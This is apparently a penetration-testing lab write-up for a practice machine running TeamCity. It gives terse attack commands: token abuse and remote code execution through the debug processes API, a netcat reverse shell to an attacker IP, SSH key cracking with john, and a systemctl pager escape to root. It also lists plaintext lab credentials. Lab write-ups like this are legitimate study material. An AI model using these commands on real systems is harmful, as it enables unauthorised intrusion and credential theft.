# Scrutiny \[Inter]

## Report



## Cheatsheet

```
Run exploit first to create admin_user

curl -X POST http://teams.onlyrands.com/app/rest/users/id:22/tokens/RPC2 -u rcity_rules_897
*curl -u [user:password combos supported]
curl -X POST 'http://teams.onlyrands.com/app/rest/debug/processes?exePath=id' -H "Authorization: Bearer $TOKEN"

busybox nc 192.168.45.238 80 -e /bin/bash
even port 8000 was blocked

git log
git show [hash]

ssh2john id_rsa > hash
john --wordlist=rockyou.txt hash
ssh -i id_rsa marcot@192.168.222.91
marcot@onlyrands:/var/mail$ cat marcot
matthewa@onlyrands:~$ cat .~
sudo /usr/bin/systemctl status teamcity-server.service
!/sh
```

### Hint

* initial exploit didnt work so fumbled
* fumbled at API token generation
* port 8000 revshell wasn't working -> fumbled
* did not clock git -> fumbled
* id\_rsa wasn't private key format -> fumbled
* reading mails and sudo -> fumbled

## Loot

### Enumeration

192.168.222.91

```
25/tcp  open   smtp    Postfix smtpd
| ssl-cert: Subject: commonName=onlyrands.com
80/tcp  open   http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: OnlyRands
| http-methods: 
|_  Supported Methods: GET HEAD
443/tcp closed https
Service Info: Host:  onlyrands.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### 80

```
http://teams.onlyrands.com/login.html
TeamCity
Version 2023.05.4 (build 129421)
```

### Attack Vectors

CVE-2023-42793 \[Auth bypass for teamcity before 2023.05.4] - FAIL

{% embed url="https://github.com/Stuub/RCity-CVE-2024-27198.git" %}

### PrivEsc

SMTP port was open right so we knew it would have something to do with emails

To use port 25 we need creds which we didn't have so maybe after initial access, but we could read from '/var/mail' directly

### Creds

```
marcot:cheer [SSH passphrase]
matthewa:IdealismEngineAshen476
briand:RefriedScabbedWasting502
```

### Proof

#### Enable Debug Mode

```
Responding with error, status code: 400 (Bad Request). 
Details: jetbrains.buildServer.server.rest.errors.BadRequestException: This server is not configured to allow process debug launch via “rest.debug.processes.enable” internal property

export TOKEN="<TOKEN HERE>"
curl -X POST 'http://teams.onlyrands.com/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true' -H "Authorization: Bearer $TOKEN"
curl 'http://teams.onlyrands.com/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties' -H "Authorization: Bearer $TOKEN"
```

```
From: matthewa@onlyrands.com
To: marcot@onlyrands.com
Subject: Goodbye, best friend
Date: Fri,  18 Feb 2022 08:43:11 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093348.E8D713650@onlyrands.com>

Marco,

Dach, the imbecile, forgot to disable my access, so you can login using my account. The password is "IdealismEngineAshen476" (without the quotation marcot).

I've left you a parting gift--your eyes only.
I'm gonna miss you, pal. Catch you on the flip side.

Sincerely,
Matthew A.
```
